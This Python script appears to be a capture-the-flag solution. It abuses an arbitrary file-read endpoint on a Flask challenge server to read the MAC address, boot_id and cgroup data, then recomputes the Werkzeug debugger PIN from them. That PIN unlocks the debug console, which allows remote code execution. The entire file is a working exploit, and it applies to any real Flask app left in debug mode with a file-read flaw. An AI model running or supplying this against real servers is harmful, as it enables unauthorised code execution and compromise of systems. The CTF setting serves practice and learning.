import hashlib
from itertools import chain
import requests

host = "http://ghazy1.local:81"  # Challenge Link


probably_public_bits = [
    'ctf',  # username
    'flask.app',  # modname
    'Flask',  # getattr(app, '__name__', getattr(app.__class__, '__name__'))
    '/usr/local/lib/python3.9/site-packages/flask/app.py'  # getattr(mod, '__file__', None),
]

# private_bits = [
#     '2485377957891',  # str(uuid.getnode()),  /sys/class/net/ens33/address
#     'f0a88324-043b-4d20-8c4b-5fbd4cfc86d347877691f496342b1991fe630571edab97ad5be68ec4e9c440e5d6a6dbfaec0d'  # get_machine_id(), /etc/machine-id
# ]
def get_private_bits():
    try:
        new_private_bits = [1,1]
        r = requests.get(f"{host}/read?file=/sys/class/net/eth0/address")
        new_private_bits[0] = str(int(r.text.strip().replace(':',''), 16))
        r2 = requests.get(f"{host}/read?file=/proc/sys/kernel/random/boot_id")
        second_private_bit = r2.text.strip()
        r3 = requests.get(f"{host}/read?file=/proc/self/cgroup")
        second_private_bit_part2 = r3.text.split("\n")[0].split("/")[-1].strip()
        new_private_bits[1] = second_private_bit + second_private_bit_part2
        return new_private_bits
    except Exception as e:
        print("An error happened while trying to get private bits: ", e)


def get_pin(private_bits):
    h = hashlib.sha1()
    for bit in chain(probably_public_bits, private_bits):
        if not bit:
            continue
        if isinstance(bit, str):
            bit = bit.encode('utf-8')
        h.update(bit)
    h.update(b'cookiesalt')
    # h.update(b'shittysalt')

    cookie_name = '__wzd' + h.hexdigest()[:20]

    num = None
    if num is None:
        h.update(b'pinsalt')
        num = ('%09d' % int(h.hexdigest(), 16))[:9]

    rv = None
    if rv is None:
        for group_size in 5, 4, 3:
            if len(num) % group_size == 0:
                rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                            for x in range(0, len(num), group_size))
                break
        else:
            rv = num

    # print(rv)
    return rv


def main():
    private_bits = get_private_bits()
    print(private_bits)
    pin = get_pin(private_bits)
    print(f"Pin: {pin}")
    # r = requests.get(f"{host}/read?file=/flag&pin={pin}")
    # print(r.text)

main()

#f0a88324-043b-4d20-8c4b-5fbd4cfc86d347877691f496342b1991fe630571edab97ad5be68ec4e9c440e5d6a6dbfaec0d
#f0a88324-043b-4d20-8c4b-5fbd4cfc86d347877691f496342b1991fe630571edab97ad5be68ec4e9c440e5d6a6dbfaec0d